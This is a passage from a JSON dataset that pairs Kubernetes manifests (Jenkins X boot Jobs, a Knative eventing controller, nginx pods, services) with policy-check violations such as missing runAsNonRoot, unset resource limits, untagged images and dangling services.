    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - -c\n        - 'mkdir -p $HOME; git config --global --add user.name $GIT_AUTHOR_NAME; git\n          config --global --add user.email $GIT_AUTHOR_EMAIL; git config --global\n          credential.helper store; git clone https://${GIT_USER}:${GIT_TOKEN}@${GIT_URL#\"https://\"}\n          ${GIT_SUB_DIR}; echo cloned url: $(inputs.params.url) to dir: ${GIT_SUB_DIR};\n          cd ${GIT_SUB_DIR}; git checkout ${GIT_REVISION}; echo checked out revision:\n          ${GIT_REVISION} to dir: ${GIT_SUB_DIR}'\n        command:\n        - /bin/sh\n        env:\n        - name: GIT_URL\n          valueFrom:\n            secretKeyRef:\n              key: url\n              name: jx-boot\n        - name: GIT_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: jx-boot\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: jx-boot\n        - name: GIT_REVISION\n          value: master\n        - name: GIT_SUB_DIR\n          value: source\n        - name: GIT_AUTHOR_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_AUTHOR_NAME\n          value: jenkins-x-labs-bot\n        - name: GIT_COMMITTER_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_COMMITTER_NAME\n          value: jenkins-x-labs-bot\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-cli:3.0.84\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        image: gcr.io/jenkinsxio/jx-cli:3.0.84\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"job\" is not set to runAsNonRoot"
  },
  {
    "id": "10438",
    "manifest_path": "data/manifests/the_stack_sample/sample_4023.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - -c\n        - 'mkdir -p $HOME; git config --global --add user.name $GIT_AUTHOR_NAME; git\n          config --global --add user.email $GIT_AUTHOR_EMAIL; git config --global\n          credential.helper store; git clone https://${GIT_USER}:${GIT_TOKEN}@${GIT_URL#\"https://\"}\n          ${GIT_SUB_DIR}; echo cloned url: $(inputs.params.url) to dir: ${GIT_SUB_DIR};\n          cd ${GIT_SUB_DIR}; git checkout ${GIT_REVISION}; echo checked out revision:\n          ${GIT_REVISION} to dir: ${GIT_SUB_DIR}'\n        command:\n        - /bin/sh\n        env:\n        - name: GIT_URL\n          valueFrom:\n            secretKeyRef:\n              key: url\n              name: jx-boot\n        - name: GIT_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: jx-boot\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: jx-boot\n        - name: GIT_REVISION\n          value: master\n        - name: GIT_SUB_DIR\n          value: source\n        - name: GIT_AUTHOR_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_AUTHOR_NAME\n          value: jenkins-x-labs-bot\n        - name: GIT_COMMITTER_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_COMMITTER_NAME\n          value: jenkins-x-labs-bot\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-cli:3.0.84\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        image: gcr.io/jenkinsxio/jx-cli:3.0.84\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"git-clone\" has cpu request 0"
  },
  {
    "id": "10439",
    "manifest_path": "data/manifests/the_stack_sample/sample_4023.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - -c\n        - 'mkdir -p $HOME; git config --global --add user.name $GIT_AUTHOR_NAME; git\n          config --global --add user.email $GIT_AUTHOR_EMAIL; git config --global\n          credential.helper store; git clone https://${GIT_USER}:${GIT_TOKEN}@${GIT_URL#\"https://\"}\n          ${GIT_SUB_DIR}; echo cloned url: $(inputs.params.url) to dir: ${GIT_SUB_DIR};\n          cd ${GIT_SUB_DIR}; git checkout ${GIT_REVISION}; echo checked out revision:\n          ${GIT_REVISION} to dir: ${GIT_SUB_DIR}'\n        command:\n        - /bin/sh\n        env:\n        - name: GIT_URL\n          valueFrom:\n            secretKeyRef:\n              key: url\n              name: jx-boot\n        - name: GIT_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: jx-boot\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: jx-boot\n        - name: GIT_REVISION\n          value: master\n        - name: GIT_SUB_DIR\n          value: source\n        - name: GIT_AUTHOR_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_AUTHOR_NAME\n          value: jenkins-x-labs-bot\n        - name: GIT_COMMITTER_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_COMMITTER_NAME\n          value: jenkins-x-labs-bot\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-cli:3.0.84\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        image: gcr.io/jenkinsxio/jx-cli:3.0.84\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"job\" has cpu request 0"
  },
  {
    "id": "10440",
    "manifest_path": "data/manifests/the_stack_sample/sample_4023.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - -c\n        - 'mkdir -p $HOME; git config --global --add user.name $GIT_AUTHOR_NAME; git\n          config --global --add user.email $GIT_AUTHOR_EMAIL; git config --global\n          credential.helper store; git clone https://${GIT_USER}:${GIT_TOKEN}@${GIT_URL#\"https://\"}\n          ${GIT_SUB_DIR}; echo cloned url: $(inputs.params.url) to dir: ${GIT_SUB_DIR};\n          cd ${GIT_SUB_DIR}; git checkout ${GIT_REVISION}; echo checked out revision:\n          ${GIT_REVISION} to dir: ${GIT_SUB_DIR}'\n        command:\n        - /bin/sh\n        env:\n        - name: GIT_URL\n          valueFrom:\n            secretKeyRef:\n              key: url\n              name: jx-boot\n        - name: GIT_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: jx-boot\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: jx-boot\n        - name: GIT_REVISION\n          value: master\n        - name: GIT_SUB_DIR\n          value: source\n        - name: GIT_AUTHOR_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_AUTHOR_NAME\n          value: jenkins-x-labs-bot\n        - name: GIT_COMMITTER_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_COMMITTER_NAME\n          value: jenkins-x-labs-bot\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-cli:3.0.84\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        image: gcr.io/jenkinsxio/jx-cli:3.0.84\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"git-clone\" has memory limit 0"
  },
  {
    "id": "10441",
    "manifest_path": "data/manifests/the_stack_sample/sample_4023.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - -c\n        - 'mkdir -p $HOME; git config --global --add user.name $GIT_AUTHOR_NAME; git\n          config --global --add user.email $GIT_AUTHOR_EMAIL; git config --global\n          credential.helper store; git clone https://${GIT_USER}:${GIT_TOKEN}@${GIT_URL#\"https://\"}\n          ${GIT_SUB_DIR}; echo cloned url: $(inputs.params.url) to dir: ${GIT_SUB_DIR};\n          cd ${GIT_SUB_DIR}; git checkout ${GIT_REVISION}; echo checked out revision:\n          ${GIT_REVISION} to dir: ${GIT_SUB_DIR}'\n        command:\n        - /bin/sh\n        env:\n        - name: GIT_URL\n          valueFrom:\n            secretKeyRef:\n              key: url\n              name: jx-boot\n        - name: GIT_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: jx-boot\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: jx-boot\n        - name: GIT_REVISION\n          value: master\n        - name: GIT_SUB_DIR\n          value: source\n        - name: GIT_AUTHOR_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_AUTHOR_NAME\n          value: jenkins-x-labs-bot\n        - name: GIT_COMMITTER_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_COMMITTER_NAME\n          value: jenkins-x-labs-bot\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-cli:3.0.84\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        image: gcr.io/jenkinsxio/jx-cli:3.0.84\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"job\" has memory limit 0"
  },
  {
    "id": "10442",
    "manifest_path": "data/manifests/the_stack_sample/sample_4027.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eventing-controller\n  namespace: knative-eventing\n  labels:\n    eventing.knative.dev/release: devel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eventing-controller\n  template:\n    metadata:\n      labels:\n        app: eventing-controller\n        eventing.knative.dev/release: devel\n    spec:\n      serviceAccountName: eventing-controller\n      containers:\n      - name: eventing-controller\n        image: ko://knative.dev/eventing/cmd/controller\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/eventing\n        - name: PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/ping\n        - name: MT_PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/mtping\n        - name: APISERVER_RA_IMAGE\n          value: ko://knative.dev/eventing/cmd/apiserver_receive_adapter\n        securityContext:\n          allowPrivilegeEscalation: false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"eventing-controller\" is using an invalid container image, \"ko://knative.dev/eventing/cmd/controller\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10443",
    "manifest_path": "data/manifests/the_stack_sample/sample_4027.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eventing-controller\n  namespace: knative-eventing\n  labels:\n    eventing.knative.dev/release: devel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eventing-controller\n  template:\n    metadata:\n      labels:\n        app: eventing-controller\n        eventing.knative.dev/release: devel\n    spec:\n      serviceAccountName: eventing-controller\n      containers:\n      - name: eventing-controller\n        image: ko://knative.dev/eventing/cmd/controller\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/eventing\n        - name: PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/ping\n        - name: MT_PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/mtping\n        - name: APISERVER_RA_IMAGE\n          value: ko://knative.dev/eventing/cmd/apiserver_receive_adapter\n        securityContext:\n          allowPrivilegeEscalation: false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"eventing-controller\" does not have a read-only root file system"
  },
  {
    "id": "10444",
    "manifest_path": "data/manifests/the_stack_sample/sample_4027.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eventing-controller\n  namespace: knative-eventing\n  labels:\n    eventing.knative.dev/release: devel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eventing-controller\n  template:\n    metadata:\n      labels:\n        app: eventing-controller\n        eventing.knative.dev/release: devel\n    spec:\n      serviceAccountName: eventing-controller\n      containers:\n      - name: eventing-controller\n        image: ko://knative.dev/eventing/cmd/controller\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/eventing\n        - name: PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/ping\n        - name: MT_PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/mtping\n        - name: APISERVER_RA_IMAGE\n          value: ko://knative.dev/eventing/cmd/apiserver_receive_adapter\n        securityContext:\n          allowPrivilegeEscalation: false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"eventing-controller\" not found"
  },
  {
    "id": "10445",
    "manifest_path": "data/manifests/the_stack_sample/sample_4027.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eventing-controller\n  namespace: knative-eventing\n  labels:\n    eventing.knative.dev/release: devel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eventing-controller\n  template:\n    metadata:\n      labels:\n        app: eventing-controller\n        eventing.knative.dev/release: devel\n    spec:\n      serviceAccountName: eventing-controller\n      containers:\n      - name: eventing-controller\n        image: ko://knative.dev/eventing/cmd/controller\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/eventing\n        - name: PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/ping\n        - name: MT_PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/mtping\n        - name: APISERVER_RA_IMAGE\n          value: ko://knative.dev/eventing/cmd/apiserver_receive_adapter\n        securityContext:\n          allowPrivilegeEscalation: false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"eventing-controller\" is not set to runAsNonRoot"
  },
  {
    "id": "10446",
    "manifest_path": "data/manifests/the_stack_sample/sample_4027.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eventing-controller\n  namespace: knative-eventing\n  labels:\n    eventing.knative.dev/release: devel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eventing-controller\n  template:\n    metadata:\n      labels:\n        app: eventing-controller\n        eventing.knative.dev/release: devel\n    spec:\n      serviceAccountName: eventing-controller\n      containers:\n      - name: eventing-controller\n        image: ko://knative.dev/eventing/cmd/controller\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/eventing\n        - name: PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/ping\n        - name: MT_PING_IMAGE\n          value: ko://knative.dev/eventing/cmd/mtping\n        - name: APISERVER_RA_IMAGE\n          value: ko://knative.dev/eventing/cmd/apiserver_receive_adapter\n        securityContext:\n          allowPrivilegeEscalation: false\n        ports:\n        - name: metrics\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"eventing-controller\" has memory limit 0"
  },
  {
    "id": "10447",
    "manifest_path": "data/manifests/the_stack_sample/sample_4031.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: storage-pod\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    volumeMounts:\n    - mountPath: /data\n      name: custom-csi-volume\n  volumes:\n  - name: custom-csi-volume\n    persistentVolumeClaim:\n      claimName: storage-pvc\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10448",
    "manifest_path": "data/manifests/the_stack_sample/sample_4031.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: storage-pod\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    volumeMounts:\n    - mountPath: /data\n      name: custom-csi-volume\n  volumes:\n  - name: custom-csi-volume\n    persistentVolumeClaim:\n      claimName: storage-pvc\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "10449",
    "manifest_path": "data/manifests/the_stack_sample/sample_4031.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: storage-pod\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    volumeMounts:\n    - mountPath: /data\n      name: custom-csi-volume\n  volumes:\n  - name: custom-csi-volume\n    persistentVolumeClaim:\n      claimName: storage-pvc\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "10450",
    "manifest_path": "data/manifests/the_stack_sample/sample_4031.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: storage-pod\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    volumeMounts:\n    - mountPath: /data\n      name: custom-csi-volume\n  volumes:\n  - name: custom-csi-volume\n    persistentVolumeClaim:\n      claimName: storage-pvc\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "10451",
    "manifest_path": "data/manifests/the_stack_sample/sample_4031.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: storage-pod\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    volumeMounts:\n    - mountPath: /data\n      name: custom-csi-volume\n  volumes:\n  - name: custom-csi-volume\n    persistentVolumeClaim:\n      claimName: storage-pvc\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "10452",
    "manifest_path": "data/manifests/the_stack_sample/sample_4035.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: pioneers-dev-redis-service\n  namespace: default\nspec:\n  clusterIP: 10.20.5.101\n  ports:\n  - port: 6379\n    name: primary\n    protocol: TCP\n    targetPort: 6379\n  - port: 16379\n    name: gossip\n    protocol: TCP\n    targetPort: 16379\n  selector:\n    run: pioneers-dev-redis\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[run:pioneers-dev-redis])"
  },
  {
    "id": "10453",
    "manifest_path": "data/manifests/the_stack_sample/sample_4037.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: enterprise-metrics-query-frontend\n    app.kubernetes.io/managed-by: Helmraiser\n    chart: enterprise-metrics-1.4.7\n    heritage: Helm\n    release: enterprise-metrics\n  name: enterprise-metrics-query-frontend-headless\n  namespace: enterprise-metrics\nspec:\n  clusterIP: None\n  ports:\n  - name: http-metrics\n    port: 8080\n    protocol: TCP\n    targetPort: http-metrics\n  - name: grpc\n    port: 9095\n    protocol: TCP\n    targetPort: grpc\n  selector:\n    app: enterprise-metrics-query-frontend\n    release: enterprise-metrics\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:enterprise-metrics-query-frontend release:enterprise-metrics])"
  },
  {
    "id": "10454",
    "manifest_path": "data/manifests/the_stack_sample/sample_4039.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: horusec-admin\n  labels:\n    app: horusec-admin\nspec:\n  selector:\n    app: horusec-admin\n  ports:\n  - port: 3000\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:horusec-admin])"
  },
  {
    "id": "10455",
    "manifest_path": "data/manifests/the_stack_sample/sample_4041.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10456",
    "manifest_path": "data/manifests/the_stack_sample/sample_4041.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "10457",
    "manifest_path": "data/manifests/the_stack_sample/sample_4041.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "10458",
    "manifest_path": "data/manifests/the_stack_sample/sample_4041.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "10459",
    "manifest_path": "data/manifests/the_stack_sample/sample_4041.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "10460",
    "manifest_path": "data/manifests/the_stack_sample/sample_4042.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.18\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.18\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "10461",
    "manifest_path": "data/manifests/the_stack_sample/sample_4042.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.18\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.18\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"git-clone\" does not have a read-only root file system"
  },
  {
    "id": "10462",
    "manifest_path": "data/manifests/the_stack_sample/sample_4042.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - gitops\n        - git\n        - clone\n        command:\n        - jx\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.18\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        env:\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-boot:3.1.18\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"job\" does not have a read-only root file system"
  },
  {
    "id": "10463",
    "manifest_path": "data/manifests/the_stack_sample/sample_4042.yaml",
